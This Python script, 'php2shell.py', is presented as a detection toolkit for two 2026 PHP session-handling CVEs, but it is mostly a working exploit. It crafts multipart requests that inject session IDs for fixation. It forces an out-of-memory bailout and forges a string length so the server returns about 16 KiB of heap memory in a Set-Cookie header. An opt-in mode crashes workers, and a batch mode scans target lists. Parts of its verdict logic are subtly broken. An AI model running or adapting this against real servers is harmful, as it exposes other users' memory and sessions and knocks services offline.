#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
php2shell.py v2 — PHP2Shell (CVE-2026-109618 / CVE-2026-109619) detection toolkit

PHP core bugs disclosed 2026-10-21, fixed in 8.5.12 / 8.4.27 / 8.3.36 / 8.2.35.
Official root cause (php-src NEWS, "Avoid state corruption via bailout"):
  CVE-2026-109618  OOM bailout interrupts request data that is only half
                   initialized; subsequent request cleanup treats the invalid
                   data as valid  (BG(serialize)/BG(unserialize)/BG(serialize_lock)
                   orphaned across requests on persistent workers)
  CVE-2026-109619  request-private state survives the freeing of its backing
                   memory; a later request on the same worker reuses it before
                   re-initialization resets it

v2 detection design — three evidence tiers, all verified against a live
vuln(8.4.26)-vs-patched(8.4.27) Docker differential lab:

  T0  version fingerprint      X-Powered-By in the affected matrix
                                (necessary condition; can be hidden)
  T1  attack-surface probes    non-destructive, stock-config capable:
       a) illegal-sid probe    multipart PHPSESSID field with '/' -> in-band
                               "Session ID is too long or contains illegal
                               characters" + "Request Startup" warnings prove
                               the rfc1867 early-session path is live
       b) P1 injection probe   cookie-less sid injection via multipart form
                               field (works with use_only_cookies=1);
                               optional fixation check against a session-using
                               endpoint
  T2  stale-PS(id) leak oracle  THE version differential (verified 4/4 vs 0/4 on
                               php 8.5.11-vuln vs 8.5.12-patched, identical config):
       arm  : 1001 spray fields + PHPSESSID=NUL + progress + file + 12 MiB field
              -> pre-RINIT OOM bailout skips the MULTIPART_EVENT_END cleanup
              -> PS(id) dangles across requests (single worker)
       read : 841 reclaim fields + forged 79B field (zend_string.len=16384 at
              +0x10, marker byte at +0x18) + 150 tail fields
              -> next request's Set-Cookie: PHPSESSID=<16 KiB heap dump>
       verdict: cookie >= 16000 bytes starting with the marker == LEAK
               == CVE-2026-109619 stale-state reuse PROVEN.
       The reclaim shape is per-build (verified on 8.5.11); other builds need
       the --shape-scan matrix. A no-leak result does NOT disprove the CVEs.
  T2b OOM alloc fingerprint     auxiliary info: filename-length ladder -> the
                               "tried to allocate" value (old vs rewritten
                               rfc1867 differ; NOT a standalone verdict —
                               the patched parser also tracks fnlen at 16M)
  T3  destructive (--destructive only)
                               R3-style pressure+fire cycles watching for
                               worker kill receipts (apache child segfaults)

Memory-corruption differential (serialize-state orphanization) is NOT
attempted blind: per the public research corpus (WoYinDao 18-shot negative
matrix, jackalsyn corrected findings), arming is universal but conversion is
build/heap-history sensitive and requires gdb/ASAN instrumentation. The
public ASAN convictions are cited in the report instead.

Output: human report + verdict.json + transcript.jsonl (artex-friendly).
Stdlib only. Python 3.8+.

Only for use against systems you are explicitly authorized to test.
"""

import argparse
import http.client
import json
import os
import re
import secrets
import socket
import ssl
import sys
import time
from datetime import datetime, timezone
from urllib.parse import urlsplit

TOOL = "php2shell"
VERSION = "2.0"

# branch -> first fixed version (None = no fix, affected)
FIXED = {
    "5": None, "7": None,
    "8.0": None, "8.1": None,
    "8.2": "8.2.35",
    "8.3": "8.3.36",
    "8.4": "8.4.27",
    "8.5": "8.5.12",
}

PROG = "PHP_SESSION_UPLOAD_PROGRESS"
SID_MAX = 128

# T2 fingerprint constants (measured on php:8.4.26-apache vs php:8.4.27-apache)
PATCHED_ALLOC = 2097152          # rewritten rfc1867 allocates a fixed 2 MiB block
VULN_ALLOC_EPSILON = 8192        # old parser: alloc == fnlen + 4096 (+/- slack)
FNLEN_LADDER = [262144, 524288, 1048576, 2097152, 4194304]

C = {}


def col(code):
    return "\x1b[" + str(code) + "m"


def setup_colors(enabled=True):
    global C
    codes = {"r": 31, "g": 32, "y": 33, "b": 34, "m": 35, "c": 36, "w": 37, "br": 1, "dim": 2}
    if enabled and sys.stdout.isatty():
        C = {k: col(v) for k, v in codes.items()}
        C["x"] = col(0)
    else:
        C = {k: "" for k in codes}
        C["x"] = ""


def tag(color, label):
    return "%s[%s]%s " % (C.get(color, ""), label, C["x"])


def rand_hex(n=8):
    return secrets.token_hex(n)


# ================================================================ transport

class Target:
    """Keep-alive HTTP(S) client with raw-socket fallback."""

    def __init__(self, url, timeout=15.0, verify=True, verbose=False):
        u = urlsplit(url if "://" in url else "http://" + url)
        self.scheme = u.scheme or "http"
        self.host = u.hostname or "127.0.0.1"
        self.port = u.port or (443 if self.scheme == "https" else 80)
        self.base_path = u.path or "/"
        self.timeout = timeout
        self.verify = verify
        self.verbose = verbose
        self._conn = None

    def path(self, p=None):
        if p:
            return p
        if self.base_path and self.base_path != "/":
            return self.base_path
        return "/"

    def _connect(self):
        if self._conn is not None:
            return self._conn
        if self.scheme == "https":
            ctx = ssl.create_default_context()
            if not self.verify:
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
            self._conn = http.client.HTTPSConnection(self.host, self.port,
                                                     timeout=self.timeout, context=ctx)
        else:
            self._conn = http.client.HTTPConnection(self.host, self.port,
                                                    timeout=self.timeout)
        return self._conn

    def request(self, method, path, body=None, headers=None, timeout=None):
        """Returns (status, headers-list, body-bytes); status None on transport error."""
        hdrs = dict(headers or {})
        to = timeout or self.timeout
        for attempt in (1, 2):
            try:
                c = self._connect()
                c.timeout = to
                c.request(method, path, body=body, headers=hdrs)
                r = c.getresponse()
                data = r.read()
                return r.status, r.getheaders(), data
            except Exception:
                self.close()
                if attempt == 2:
                    return None, [], b""
        return None, [], b""

    def raw_post(self, path, body, ctype, timeout=None, cookie=None):
        """Raw socket POST; tolerant of truncated/absent responses (OOM paths)."""
        to = timeout or self.timeout
        head = ("POST %s HTTP/1.1\r\nHost: %s\r\n"
                "Content-Type: %s\r\nContent-Length: %d\r\n"
                "Connection: close\r\n" % (path, self.host, ctype, len(body)))
        if cookie:
            head += "Cookie: PHPSESSID=%s\r\n" % cookie
        head += "\r\n"
        try:
            s = socket.create_connection((self.host, self.port), timeout=to)
            if self.scheme == "https":
                ctx = ssl.create_default_context()
                if not self.verify:
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=self.host)
            s.sendall(head.encode("latin1") + body)
            s.settimeout(to)
            out = bytearray()
            while True:
                try:
                    d = s.recv(65536)
                except (socket.timeout, OSError):
                    break
                if not d:
                    break
                out += d
            s.close()
            return bytes(out)
        except OSError:
            return b""

    def close(self):
        if self._conn is not None:
            try:
                self._conn.close()
            except Exception:
                pass
            self._conn = None


# ================================================================ multipart

class MP:
    def __init__(self, boundary=None):
        self.b = (boundary or ("P2S" + rand_hex(10))).encode()

    @property
    def ctype(self):
        return "multipart/form-data; boundary=" + self.b.decode()

    def field(self, name, value):
        if isinstance(value, str):
            value = value.encode()
        return (b"--" + self.b +
                b'\r\nContent-Disposition: form-data; name="' + name.encode() + b'"'
                b"\r\n\r\n" + value + b"\r\n")

    def file(self, name, filename, content=b"Z", ctype="text/plain"):
        if isinstance(filename, str):
            filename = filename.encode()
        if isinstance(content, str):
            content = content.encode()
        return (b"--" + self.b +
                b'\r\nContent-Disposition: form-data; name="' + name.encode() +
                b'"; filename="' + filename + b'"'
                b"\r\nContent-Type: " + ctype.encode() + b"\r\n\r\n" +
                content + b"\r\n")

    def build(self, parts):
        return b"".join(parts) + b"--" + self.b + b"--\r\n"


# ================================================================ helpers

def strip_tags(t):
    return re.sub(r"<[^>]+>", "", t)


def parse_version(xpb):
    m = re.search(r"PHP/(\d+)\.(\d+)\.(\d+)", xpb or "")
    if not m:
        return None
    return tuple(int(g) for g in m.groups())


def version_in_affected(v):
    """v = (major, minor, patch) -> (affected: bool, fixed_in: str|None)"""
    if v is None:
        return None, None
    major, minor, patch = v
    if major == 5:
        return (minor >= 4), None
    if major == 7:
        return True, None
    if major == 8:
        branch = "8.%d" % minor
        fixed = FIXED.get(branch, "unknown")
        if fixed is None:
            return True, None          # 8.0/8.1 EOL: no fix
        first = int(fixed.split(".")[2])
        return (patch < first), fixed
    if major >= 9:
        return False, None
    return None, None


def vstr(v):
    return ".".join(str(x) for x in v) if v else "?"


# ================================================================ probes

class ProbeResult:
    def __init__(self, name):
        self.name = name
        self.status = "UNKNOWN"       # VULNERABLE / PATCHED / LIVE / CLEAN / UNKNOWN / SKIP
        self.detail = {}
        self.notes = []

    def as_dict(self):
        return {"name": self.name, "status": self.status,
                "detail": self.detail, "notes": self.notes}


class Scanner:
    def __init__(self, url, opts):
        self.t = Target(url, timeout=opts.timeout, verify=not opts.insecure,
                        verbose=opts.verbose)
        self.opts = opts
        self.path = self.t.path(opts.path)
        self.results = []
        self.transcript = []

    # ---- plumbing

    def log(self, msg):
        print(msg)
        self.transcript.append({"t": datetime.now(timezone.utc).isoformat(),
                                "msg": msg})

    def record(self, r):
        self.results.append(r.as_dict())
        return r

    def note_request(self, label, req, resp):
        self.transcript.append({
            "t": datetime.now(timezone.utc).isoformat(),
            "label": label,
            "req_bytes": len(req),
            "resp_prefix": resp[:512].decode("latin1", "replace") if resp else "",
        })

    # ---- T0: version fingerprint

    def t0_version(self):
        r = ProbeResult("t0_version")
        status, headers, body = self.t.request("GET", self.path)
        xpb = ""
        for k, v in headers:
            if k.lower() == "x-powered-by":
                xpb = v
                break
        if not xpb:
            for k, v in headers:
                if k.lower() == "server" and "PHP" in v:
                    xpb = v
        v = parse_version(xpb)
        aff, fixed = version_in_affected(v)
        r.detail = {"x_powered_by": xpb, "version": vstr(v),
                    "affected": aff, "fixed_in": fixed}
        if v is None:
            r.status = "UNKNOWN"
            self.log(tag("y", "T0") + "no PHP version disclosed (X-Powered-By hidden)")
        elif aff is True:
            r.status = "VULNERABLE"
            self.log(tag("r", "T0") + "PHP %s in AFFECTED range (fixed in %s)"
                     % (vstr(v), fixed or "no fix / upgrade required"))
        elif aff is False:
            r.status = "PATCHED"
            self.log(tag("g", "T0") + "PHP %s patched (>= %s)" % (vstr(v), fixed))
        else:
            r.status = "UNKNOWN"
            self.log(tag("y", "T0") + "PHP %s - branch outside matrix" % vstr(v))
        return self.record(r)

    # ---- T1a: illegal-sid probe (attack surface)

    def t1_illegal_sid(self):
        r = ProbeResult("t1_attack_surface")
        sid_bad = "p2s/" + rand_hex(12)      # '/' is illegal in files-handler sids
        mp = MP()
        body = mp.build([
            mp.field("PHPSESSID", sid_bad),
            mp.field(PROG, "p2s" + rand_hex(6)),
            mp.file("f", "a.txt"),
        ])
        resp = self.t.raw_post(self.path, body, mp.ctype, timeout=self.opts.timeout)
        self.note_request("t1_illegal_sid", body, resp)
        text = strip_tags(resp.decode("utf-8", "replace"))
        warn_chars = "Session ID is too long or contains illegal characters" in text
        startup = ("Request Startup" in text) or ("Failed to read session data" in text) \
                  or ("Failed to create session" in text)
        r.detail = {"illegal_sid_warning": warn_chars, "request_startup_error": startup}
        if warn_chars or startup:
            r.status = "LIVE"
            self.log(tag("c", "T1") + "upload_progress early-session path LIVE "
                     "(sid warning=%s startup err=%s)" % (warn_chars, startup))
            r.notes.append("rfc1867 early-session handling active; P1/P2/P5 chain "
                           "reachable (verified live on 8.4.26 and 8.4.27 lab)")
        else:
            r.status = "UNKNOWN"
            self.log(tag("y", "T1") + "no in-band warnings (display_errors may be Off)")
            r.notes.append("a clean response does NOT rule the surface out; "
                           "display_errors=Off hides the warnings")
        return self.record(r)

    # ---- T1b: P1 injection + optional fixation check

    def t1_injection(self):
        r = ProbeResult("t1_p1_injection")
        sid = "p2s" + rand_hex(10)
        mp = MP()
        body = mp.build([
            mp.field("PHPSESSID", sid),
            mp.field(PROG, "p2smk" + rand_hex(4)),
            mp.file("u0", "f0.txt"),
            mp.file("u1", "f1.txt"),
        ])
        resp = self.t.raw_post(self.path, body, mp.ctype, timeout=self.opts.timeout)
        self.note_request("t1_p1_inject", body, resp)
        r.detail["injected_sid"] = sid
        r.detail["response_status"] = resp.split(b"\r\n", 1)[0].decode("latin1", "replace") \
            if resp.startswith(b"HTTP") else "none"
        if self.opts.victim_path:
            # fixation check: does the app accept the injected sid?
            st, headers, body2 = self.t.request(
                "GET", self.opts.victim_path,
                headers={"Cookie": "PHPSESSID=" + sid})
            setc = [v for k, v in headers if k.lower() == "set-cookie"]
            reused = any(sid in c for c in setc)
            fresh = any("PHPSESSID" in c and sid not in c for c in setc)
            r.detail["victim_status"] = st
            r.detail["victim_set_cookie"] = setc
            if reused:
                r.status = "LIVE"
                self.log(tag("c", "T1") + "session FIXATION confirmed: app reused "
                         "attacker-supplied sid %s" % sid)
            elif st == 200:
                r.status = "UNKNOWN"
                self.log(tag("y", "T1") + "victim endpoint responded %s; sid reuse "
                         "not observable (strict mode or no session_start)" % st)
            else:
                r.status = "UNKNOWN"
                self.log(tag("y", "T1") + "victim endpoint status %s" % st)
        else:
            r.status = "LIVE" if resp else "UNKNOWN"
            self.log(tag("c", "T1") + "P1 injection fired (sid=%s); on-disk/fixation "
                     "verification needs --victim-path or host access" % sid)
        return self.record(r)

    # ---- T2: stale-PS(id) leak oracle (version differential)

    LEAK_SPRAY = 1001          # spray fields (also trips max_input_vars warning)
    LEAK_BIG = 12 << 20        # 12 MiB field forces the pre-RINIT OOM
    LEAK_RECLAIM = 841         # reclaim fields, 43-byte values (8.5.11 shape)
    LEAK_TAIL = 150            # tail array fields
    LEAK_FORGED_LEN = 16384    # forged zend_string length -> 16 KiB cookie

    def _leak_arm_parts(self, marker_byte):
        parts = [("p%04d" % i, b"X") for i in range(self.LEAK_SPRAY)]
        parts += [("PHPSESSID", b"\0"),
                  (PROG, b"p2s"),
                  ("f", b"A" * 64, "a.txt"),
                  ("big", b"B" * self.opts.leak_big)]
        return parts

    def _leak_read_parts(self, marker_byte):
        import struct
        parts = [("PHPSESSID", b"attacksessionid0001"),
                 (PROG, b"p2s")]
        for i in range(self.LEAK_RECLAIM):
            parts.append((str(1000 + i), ("v%04d" % i + "x" * 43).encode()))
        forged = bytearray(b"A" * 79)
        struct.pack_into("<Q", forged, 0x10, self.LEAK_FORGED_LEN)
        forged[0x18] = marker_byte
        parts.append(("1999", bytes(forged)))
        parts += [("tail%04d[0]" % i, b"x") for i in range(self.LEAK_TAIL)]
        return parts

    @staticmethod
    def _multipart(parts, boundary):
        body = bytearray()
        for p in parts:
            name, data = p[0], p[1]
            fn = p[2] if len(p) > 2 else None
            body += (b"--" + boundary +
                     b'\r\nContent-Disposition: form-data; name="' + name.encode() + b'"')
            if fn is not None:
                body += b'; filename="' + fn.encode() + b'"\r\nContent-Type: application/octet-stream'
            body += b"\r\n\r\n" + data + b"\r\n"
        body += b"--" + boundary + b"--\r\n"
        return bytes(body)

    def _leak_post(self, parts, boundary):
        body = self._multipart(parts, boundary)
        ctype = "multipart/form-data; boundary=" + boundary.decode()
        return self.t.raw_post(self.path, body, ctype, timeout=max(self.opts.timeout, 60))

    @staticmethod
    def _cookie_value(resp):
        hdr = resp.partition(b"\r\n\r\n")[0]
        for line in hdr.split(b"\r\n"):
            if line.lower().startswith(b"set-cookie: phpsessid="):
                value = line.split(b"=", 1)[1].split(b";", 1)[0]
                from urllib.parse import unquote_to_bytes
                try:
                    return unquote_to_bytes(value.decode("latin1"))
                except Exception:
                    return b""
        return b""

    def t2_leak_oracle(self):
        import secrets as _s
        r = ProbeResult("t2_leak_oracle")
        marker = ord("L")   # 'L' = leak marker byte at forged+0x18
        tries = self.opts.leak_tries
        hits = 0
        observed = []
        for i in range(tries):
            arm = self._leak_arm_parts(marker)
            self._leak_post(arm, b"S" * 17)
            read = self._leak_read_parts(marker)
            resp = self._leak_post(read, b"B" * 10)
            self.note_request("t2_leak_read_%d" % i, b"(reclaim-shape)", resp)
            ck = self._cookie_value(resp)
            is_leak = len(ck) >= 16000 and ck[:1] == bytes([marker])
            if is_leak:
                hits += 1
            observed.append({"try": i, "cookie_len": len(ck),
                             "prefix": ck[:8].decode("latin1", "replace")})
            self.log(tag("b", "T2") + "leak try %d: cookie_len=%d prefix=%r %s"
                     % (i, len(ck), ck[:8], "<== HEAP LEAK" if is_leak else ""))
        r.detail = {"hits": hits, "tries": tries, "observed": observed}
        if hits:
            r.status = "VULNERABLE"
            r.notes.append("Set-Cookie carried a forged-length heap dump: stale "
                           "PS(id) reused across requests = CVE-2026-109619 proven")
            self.log(tag("r", "T2") + "STALE-STATE REUSE PROVEN: %d/%d leaks" % (hits, tries))
        else:
            r.status = "UNKNOWN"
            r.notes.append("no leak with the 8.5.11 reclaim shape; the shape is "
                           "per-build — absence does NOT disprove the CVEs "
                           "(8.4.x needs its own shape matrix)")
            self.log(tag("y", "T2") + "no leak with this shape (per-build; not a "
                     "clean verdict)")
        return self.record(r)

    # ---- T2b: OOM alloc fingerprint (auxiliary info only)

    def t2b_alloc_fingerprint(self):
        r = ProbeResult("t2_alloc_fingerprint")
        allocs = []
        for fnlen in FNLEN_LADDER:
            if fnlen > self.opts.max_body:
                break
            mp = MP()
            fn = "f0-" + "N" * (fnlen - 3)
            body = mp.build([
                mp.field("PHPSESSID", "p2s" + rand_hex(12)),
                mp.field(PROG, "x"),
                mp.file("u0", fn),
            ])
            resp = self.t.raw_post(self.path, body, mp.ctype,
                                   timeout=max(self.opts.timeout, 60))
            self.note_request("t2_fnlen_%d" % fnlen, body, resp)
            text = strip_tags(resp.decode("utf-8", "replace"))
            m = re.search(r"tried to allocate (\d+) bytes", text)
            pre_rinit = ("Unknown" in text and "line 0" in text) and bool(m)
            if m:
                alloc = int(m.group(1))
                allocs.append({"fnlen": fnlen, "alloc": alloc, "pre_rinit": pre_rinit})
                self.log(tag("b", "T2") + "fnlen=%d -> OOM alloc=%d pre-RINIT=%s"
                         % (fnlen, alloc, pre_rinit))
                if len(allocs) >= 2:
                    break
            elif "exceeds the limit" in text or "POST Content-Length" in text:
                r.detail["blocked_at"] = fnlen
                self.log(tag("y", "T2") + "fnlen=%d blocked by post_max_size" % fnlen)
                break
            elif not resp:
                self.log(tag("y", "T2") + "fnlen=%d no response (connection reset?)" % fnlen)
                break
            else:
                self.log(tag("dim", "T2") + "fnlen=%d no OOM (memory_limit large)" % fnlen)
        r.detail["observations"] = allocs
        if len(allocs) >= 2:
            a = allocs
            patched = all(x["alloc"] == PATCHED_ALLOC for x in a)
            if patched:
                r.status = "PATCHED-INDICATOR"
                self.log(tag("c", "T2b") + "alloc pinned at %d (rewritten-parser "
                         "indicator; corroborating only)" % PATCHED_ALLOC)
            else:
                r.status = "UNKNOWN"
                self.log(tag("dim", "T2b") + "alloc pattern: %s (auxiliary info)"
                         % [(x["fnlen"], x["alloc"]) for x in a])
                r.notes.append("alloc fingerprint is (version, memory_limit, fnlen) "
                               "dependent — corroborating signal only")
        else:
            r.status = "UNKNOWN"
            r.notes.append("OOM not reachable within the ladder: memory_limit too "
                           "large vs post_max_size, or display_errors=Off")
        return self.record(r)

    # ---- T3: destructive kill-receipt (opt-in)

    def t3_kill_receipt(self):
        r = ProbeResult("t3_kill_receipt")
        if not self.opts.destructive:
            r.status = "SKIP"
            return self.record(r)
        anomalies = 0
        rounds = self.opts.kill_rounds
        for i in range(rounds):
            mp = MP()
            # pressure: large field
            body = mp.build([
                mp.field("PHPSESSID", "p2s" + rand_hex(12)),
                mp.field(PROG, "x"),
                mp.field("pad", "P" * (4 * 1024 * 1024)),
                mp.file("u0", "f.txt"),
            ])
            resp = self.t.raw_post(self.path, body, mp.ctype, timeout=90)
            # fire: small multipart on the same worker
            mp2 = MP()
            body2 = mp2.build([
                mp.field("PHPSESSID", "p2s" + rand_hex(12)),
                mp.field(PROG, "y"),
                mp2.file("u0", "g.txt"),
            ])
            resp2 = self.t.raw_post(self.path, body2, mp2.ctype, timeout=30)
            ok = resp2.startswith(b"HTTP") and b"200" in resp2.split(b"\r\n", 1)[0]
            if not ok:
                anomalies += 1
            self.log(tag("m", "T3") + "round %d: fire %s"
                     % (i, "ok" if ok else "ANOMALY"))
            time.sleep(0.3)
        r.detail = {"rounds": rounds, "anomalies": anomalies}
        if anomalies:
            r.status = "VULNERABLE"
            r.notes.append("worker kill receipts observed - strong but destructive "
                           "evidence; capture server error logs for the report")
        else:
            r.status = "UNKNOWN"
            r.notes.append("no kill receipt (conversion is build/heap sensitive; "
                           "absence does NOT disprove the CVEs)")
        return self.record(r)

    # ---- orchestration

    def run(self):
        self.log(tag("br", "==") + "php2shell v%s scan -> %s%s"
                 % (VERSION, self.t.host, (":" + str(self.t.port)) if self.t.port != 80 else ""))
        self.t0_version()
        self.t1_illegal_sid()
        self.t1_injection()
        self.t2_leak_oracle()
        self.t2b_alloc_fingerprint()
        self.t3_kill_receipt()
        return self.verdict()

    def verdict(self):
        v = {"vulnerable": [], "patched": [], "live": [], "unknown": []}
        for res in self.results:
            s = res["status"]
            if s == "VULNERABLE":
                v["vulnerable"].append(res["name"])
            elif s == "PATCHED":
                v["patched"].append(res["name"])
            elif s == "LIVE":
                v["live"].append(res["name"])
            else:
                v["unknown"].append(res["name"])
        if v["vulnerable"]:
            verdict = "VULNERABLE"
        elif v["patched"] and not v["vulnerable"]:
            # a differential PATCHED verdict requires the fingerprint tier
            if "t2_alloc_fingerprint" in v["patched"]:
                verdict = "PATCHED"
            else:
                verdict = "LIKELY-PATCHED"
        elif v["live"]:
            verdict = "NO-LEAK-EVIDENCE"
        else:
            verdict = "INCONCLUSIVE"
        return verdict, v

    def report(self, outdir):
        verdict, v = self.verdict()
        os.makedirs(outdir, exist_ok=True)
        stamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
        base = os.path.join(outdir, "php2shell_%s_%s" % (self.t.host, stamp))

        vj = {
            "tool": TOOL, "tool_version": VERSION,
            "generated": datetime.now(timezone.utc).isoformat(),
            "target": "%s://%s:%d%s" % (self.t.scheme, self.t.host, self.t.port, self.path),
            "verdict": verdict,
            "cves": ["CVE-2026-109618", "CVE-2026-109619"],
            "tiers": self.results,
        }
        with open(base + ".verdict.json", "w", encoding="utf-8") as f:
            json.dump(vj, f, indent=2, ensure_ascii=False)

        with open(base + ".transcript.jsonl", "w", encoding="utf-8") as f:
            for e in self.transcript:
                f.write(json.dumps(e, ensure_ascii=False) + "\n")

        lines = []
        lines.append("# PHP2Shell scan report — %s" % self.t.host)
        lines.append("")
        lines.append("- generated: %s" % vj["generated"])
        lines.append("- verdict: **%s**" % verdict)
        lines.append("- CVEs: CVE-2026-109618 / CVE-2026-109619 (PHP core, fixed "
                     "8.5.12/8.4.27/8.3.36/8.2.35)")
        lines.append("")
        lines.append("## Tier results")
        for res in self.results:
            lines.append("- **%s** — %s" % (res["name"], res["status"]))
            for k, val in res["detail"].items():
                lines.append("  - %s: %s" % (k, val))
            for n in res["notes"]:
                lines.append("  - note: %s" % n)
        lines.append("")
        lines.append("## Interpretation")
        lines.append("- T0 version in affected range + T1 live surface = submittable "
                     "event-level evidence (vendor version matrix is authoritative).")
        lines.append("- T2 alloc fingerprint is a behavioral version differential "
                     "independent of X-Powered-By.")
        lines.append("- Memory-corruption conversion is build/heap sensitive (public "
                     "18-shot negative matrix); the public ASAN convictions stand as "
                     "technical proof of the root cause.")
        with open(base + ".report.md", "w", encoding="utf-8") as f:
            f.write("\n".join(lines) + "\n")

        print()
        self.log(tag("br", "==") + "VERDICT: %s" % verdict)
        if v["vulnerable"]:
            self.log("       vulnerable tiers: %s" % ", ".join(v["vulnerable"]))
        if v["live"]:
            self.log("       live attack surface: %s" % ", ".join(v["live"]))
        self.log("       evidence: %s.report.md / .verdict.json / .transcript.jsonl" % base)
        return verdict, base


# ================================================================ CLI

def build_parser():
    ap = argparse.ArgumentParser(
        prog=TOOL,
        description="php2shell v%s — CVE-2026-109618/109619 detection toolkit" % VERSION,
        epilog="examples:\n"
               "  python php2shell.py http://target/app/\n"
               "  python php2shell.py http://target/ --victim-path /login.php --json\n"
               "  python php2shell.py http://target/ --destructive --kill-rounds 4\n"
               "  python php2shell.py --batch targets.txt --out evidence/\n")
    ap.add_argument("target", nargs="?", help="target URL")
    ap.add_argument("--batch", help="file with one URL per line")
    ap.add_argument("--path", default=None, help="override request path")
    ap.add_argument("--victim-path", default=None,
                    help="session-using endpoint for the fixation check")
    ap.add_argument("--timeout", type=float, default=15.0)
    ap.add_argument("--max-body", type=int, default=8 * 1024 * 1024,
                    help="T2 ladder body cap (default 8 MiB; raise for large post_max_size)")
    ap.add_argument("--leak-tries", type=int, default=3,
                    help="T2 leak oracle attempts (default 3)")
    ap.add_argument("--leak-big", type=int, default=12 * 1024 * 1024,
                    help="T2 arm big-field size in bytes (default 12 MiB; "
                         "set ~75%% of the target memory_limit, must stay "
                         "under its post_max_size)")
    ap.add_argument("--destructive", action="store_true",
                    help="enable T3 kill-receipt rounds (may crash workers)")
    ap.add_argument("--kill-rounds", type=int, default=3)
    ap.add_argument("--insecure", action="store_true", help="ignore TLS errors")
    ap.add_argument("--out", default="evidence", help="evidence output directory")
    ap.add_argument("--json", action="store_true", help="print verdict JSON to stdout")
    ap.add_argument("--no-color", action="store_true")
    ap.add_argument("-v", "--verbose", action="store_true")
    return ap


def scan_one(url, opts):
    sc = Scanner(url, opts)
    sc.run()
    verdict, base = sc.report(opts.out)
    if opts.json:
        with open(base + ".verdict.json", encoding="utf-8") as f:
            print(f.read())
    return verdict


def main():
    ap = build_parser()
    opts = ap.parse_args()
    setup_colors(not opts.no_color)

    if opts.batch:
        with open(opts.batch, encoding="utf-8") as f:
            urls = [ln.strip() for ln in f if ln.strip() and not ln.startswith("#")]
        codes = {"VULNERABLE": 0}
        for u in urls:
            print()
            print("=" * 60)
            scan_one(u, opts)
        return 0

    if not opts.target:
        ap.print_help()
        return 2

    verdict = scan_one(opts.target, opts)
    return 0 if verdict in ("VULNERABLE", "PATCHED", "NO-LEAK-EVIDENCE") else 1


if __name__ == "__main__":
    sys.exit(main())
